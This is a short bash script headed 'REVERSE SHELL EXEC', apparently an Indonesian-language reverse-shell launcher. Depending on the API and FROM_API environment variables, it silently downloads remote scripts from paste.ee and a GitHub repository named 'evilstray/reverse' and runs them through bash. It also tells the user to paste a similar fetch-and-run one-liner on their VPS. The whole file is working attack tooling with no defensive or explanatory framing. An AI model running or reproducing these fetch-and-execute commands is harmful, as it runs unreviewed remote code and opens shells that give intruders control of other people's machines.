BLUE="\033[0;34m"
RED="\033[0;31m"
RESET="\033[0m"

echo -e "${BLUE} ##  REVERSE SHELL EXEC  ##"
echo -e " ## Author : @mekihunter ##${RESET}"

if [ -z "$API" ]; then
  # echo -e "${RED}Gagal: API tidak boleh kosong!${RESET}"
  :
else
  X="mekihunter_$API" bash -c "$(curl -fsSL https://paste.ee/r/PJlfsSUD/0)" >/dev/null 2>&1
  echo -e "Silahkan jalankan command berikut ini pada VPS Anda:"
  echo -e "FROM_API=\"$API\" bash -c \"\$(curl -fsSL https://raw.githubusercontent.com/evilstray/reverse/refs/heads/main/log)\""
fi

if [ -z "$FROM_API" ]; then
  # echo -e "${RED}Gagal: FROM_API tidak boleh kosong!${RESET}"
  :
else
  S="mekihunter-$FROM_API" bash -c "$(curl -fsSL https://paste.ee/r/C8YolZJS/0)"
fi
